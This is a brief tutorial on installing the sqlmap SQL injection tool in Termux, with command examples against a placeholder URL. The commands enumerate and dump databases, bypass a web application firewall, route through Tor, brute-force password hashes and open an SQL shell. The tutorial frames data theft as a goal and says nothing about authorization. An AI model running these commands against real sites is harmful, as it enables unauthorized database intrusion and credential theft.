What is Sqlmap?

Sqlmap is an open-source penetration testing tool used to detect and exploit SQL injection vulnerabilities in web applications. It automates the process of scanning, testing, and exploiting SQL injection bugs in databases.

Why Use Sqlmap?

  • To detect SQL injection vulnerabilities
  • To extract database names, tables, and columns
  • To dump user data like usernames and passwords
  • To gain shell access through SQL injection

Installing Sqlmap in Termux

  1. Update Termux packages:
    pkg update && pkg upgrade
  2. Install Python:
    pkg install python
  3. Clone sqlmap from GitHub:
    git clone https://github.com/sqlmapproject/sqlmap
  4. Navigate into the sqlmap folder:
    cd sqlmap
  5. Run sqlmap:
    python sqlmap.py

Basic Usage Examples

  • Test a URL for SQL injection:
    python sqlmap.py -u "http://example.com/page.php?id=1"
  • Dump database names:
    python sqlmap.py -u "http://example.com/page.php?id=1" --dbs
  • Select a specific database and get tables:
    python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name --tables
  • Get columns of a specific table:
    python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns
  • Dump data from a table:
    python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump

Advanced Features

  • Bypass WAF (Web Application Firewall):
    python sqlmap.py -u "URL" --tamper=between
  • Use Tor network:
    python sqlmap.py -u "URL" --tor
  • Brute-force database user password hashes:
    --passwords
  • Gain SQL shell:
    --sql-shell
